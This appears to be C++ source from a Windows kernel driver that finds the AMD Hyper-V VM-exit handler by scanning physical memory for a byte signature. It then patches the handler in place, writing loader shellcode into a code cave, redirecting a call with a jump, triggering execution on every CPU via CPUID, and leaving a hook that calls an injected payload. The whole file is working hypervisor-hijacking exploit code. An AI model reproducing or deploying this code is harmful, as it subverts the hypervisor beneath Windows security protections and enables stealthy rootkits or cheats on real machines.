#include "util.hpp"
NTSTATUS HijackVMExitHandler(PDISK disk, UINT64 exitHandlerAddress, PVOID pageBuffer, PVOID pageMapping, PHYSICAL_ADDRESS pdptPhysicalBase, UINT32 originalHookOffset, UINT32 entryPoint)
{
    PUINT8 ccPtr = (PUINT8)exitHandlerAddress;
    PUINT8 bufferEnd = (PUINT8)pageBuffer + PAGE_SIZE;
    PUINT8 nearestCC = nullptr;
	//assumes the codecave is big enough to fit the shellcode
    for (PUINT8 p = ccPtr + 1; p < bufferEnd; ++p) {
        if (*p == 0xCC) {
            nearestCC = p + 1;
            break;
        }
    }
    if (nearestCC == nullptr) {
        DbgMsg("Failed to find");
        return STATUS_UNSUCCESSFUL;
    }

    PUINT8 callInstr = (PUINT8)exitHandlerAddress;
    INT32 originalCallRel = *(INT32*)(callInstr + 1);
    UINT64 offsetFromBaseOfPage = (UINT64)exitHandlerAddress + 5 + originalCallRel - (UINT64)pageBuffer;
    SIZE_T loaderSize = (SIZE_T)((UINT8*)ExecuteCPUID - (UINT8*)LoaderASM);
    UINT8* shellcode = (UINT8*)&LoaderASM;
    for (size_t j = 0; j < loaderSize - 8; j++) {
        UINT64* candidate = (UINT64*)(shellcode + j);
        if (*candidate == 0xCAFEBABEDEADBEEF) {
            *candidate = pdptPhysicalBase.QuadPart;
            break;
        }
    }
    for (size_t j = 0; j < loaderSize - 4; j++) {
        UINT32* candidate = (UINT32*)(shellcode + j);
        if (*candidate == 0xBABECAFE) {
            *candidate = (UINT32)offsetFromBaseOfPage;
        }
        if (*candidate == 0xDEADBEEF) {
            *candidate = originalHookOffset;
        }
    }

    memcpy(nearestCC, (PVOID)LoaderASM, loaderSize);

    PUINT8 afterCall = (PUINT8)exitHandlerAddress + 5;
    PUINT8 loaderEnd = nearestCC + loaderSize;
    PUINT8 originalCallTarget = callInstr + 5 + originalCallRel;
    loaderEnd[0] = 0xE8; // CALL rel32
    *(INT32*)(loaderEnd + 1) = (INT32)(originalCallTarget - (loaderEnd + 5));

    loaderEnd[5] = 0xE9; // JMP rel32
    *(INT32*)(loaderEnd + 6) = (INT32)((UINT64)afterCall - ((UINT64)loaderEnd + 10));

    DiskCopy(disk, pageMapping, pageBuffer);

    UINT8 originalCallInstruction[5];
    memcpy(originalCallInstruction, callInstr, 5);

    callInstr[0] = 0xE9;  // jmp rel32
    *(INT32*)(callInstr + 1) = (INT32)((UINT64)nearestCC - ((UINT64)callInstr + 5));
    DiskCopy(disk, pageMapping, pageBuffer);

    //Ensure every CPU has flushed cache (ran shellcode)
    if (!NT_SUCCESS(ExecuteCPUIDEachProcessor()))
    {
        DbgMsg("Failed to execute CPUID on every processor");
        return STATUS_UNSUCCESSFUL;
    }

    Sleep(1000);

    memcpy(callInstr, originalCallInstruction, sizeof(originalCallInstruction));
    DiskCopy(disk, pageMapping, pageBuffer);

    Sleep(1000);

    memset(nearestCC, 0xCC, loaderSize);
    // ASM for the following code:
    // mov     r10, PAYLOAD_VIRTUAL_BASE + entryPoint
    // call    r10
    // jmp     <rel32 to afterCall>
    nearestCC[0] = 0x49;          // REX.W prefix with B (R10–R15)
    nearestCC[1] = 0xBA;          // MOV R10, imm64
    *(UINT64*)(nearestCC + 2) = PAYLOAD_VIRTUAL_BASE + entryPoint;  // 8-byte absolute address
    nearestCC[10] = 0x41;         // REX prefix for extended registers (R8–R15)
    nearestCC[11] = 0xFF;         // CALL r/m64 opcode
    nearestCC[12] = 0xD2;         // ModR/M byte for CALL R10
    nearestCC[13] = 0xE9;         // JMP rel32 opcode
    *(INT32*)(nearestCC + 14) = (INT32)((UINT64)afterCall - ((UINT64)nearestCC + 18));

    DiskCopy(disk, pageMapping, pageBuffer);
    Sleep(1000);

    callInstr[0] = 0xE9;  // jmp rel32
    *(INT32*)(callInstr + 1) = (INT32)((UINT64)nearestCC - ((UINT64)callInstr + 5));
    DiskCopy(disk, pageMapping, pageBuffer);

    return STATUS_SUCCESS;
}

NTSTATUS FindVMExitHandler(IN PDISK disk, OUT PVOID *mappingOut, OUT PVOID *bufferOut, OUT UINT64 *exitHandlerAddressOut, OUT PPHYSICAL_MEMORY_RANGE *hyperVRange)
{
    PHYSICAL_ADDRESS highest;
    highest.QuadPart = MAXULONG32;

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE, highest);
    if (!buffer) {
        DbgMsg("Failed to allocate buffer\n");
        return 0;
    }

    PVOID foundAddress{ };
    PHYSICAL_ADDRESS mzHeaderAddress{ };
    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    if (ranges) {
        PPHYSICAL_MEMORY_RANGE range = ranges;
        while (range->BaseAddress.QuadPart) {

            if (foundAddress != 0)
                break;

            for (UINT64 i = 0; i < (UINT64)range->NumberOfBytes.QuadPart; i += PAGE_SIZE) {
                UINT64 pfn = (range->BaseAddress.QuadPart + i) >> PAGE_SHIFT;

                MM_COPY_ADDRESS src;
                src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

                SIZE_T outSize;
                if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE, MM_COPY_MEMORY_PHYSICAL, &outSize))) {
                    continue;
                }

                if (!IsPageAllOnes(buffer)) {
                    continue;
                }

                PVOID mapping = MmMapIoSpace(src.PhysicalAddress, PAGE_SIZE, MmNonCached);
                if (!mapping) {
                    continue;
                }

                if (!NT_SUCCESS(DiskCopy(disk, buffer, mapping))) {
                    MmUnmapIoSpace(mapping, PAGE_SIZE);
                    continue;
                }

                if (foundAddress == 0 && ScanPattern(buffer, (PUINT8)AMD_VMEXIT_HANDLER_SIG, AMD_VMEXIT_HANDLER_MASK, 10, &foundAddress)) {

					*mappingOut = mapping;
					*bufferOut = buffer;
					*exitHandlerAddressOut = (UINT64)foundAddress;
					*hyperVRange = range;

                    break;
                }
                MmUnmapIoSpace(mapping, PAGE_SIZE);
            }
            ++range;
        }
        ExFreePool(ranges);
    }
    else {
        DbgMsg("Failed to get physical memory ranges\n");
    }
    if (foundAddress == 0) {
        DbgMsg("Failed to find Hyper-V VMEXIT handler\n");
        return STATUS_UNSUCCESSFUL;
	}
    return STATUS_SUCCESS;
}

BOOLEAN IsHyperVRunning(VOID) {
    INT32 info[4] = { 0 };
    __cpuid(info, CPUID_HV_VENDOR_LEAF);
    return info[1] == 'rciM' && info[2] == 'foso' && info[3] == 'vH t';
}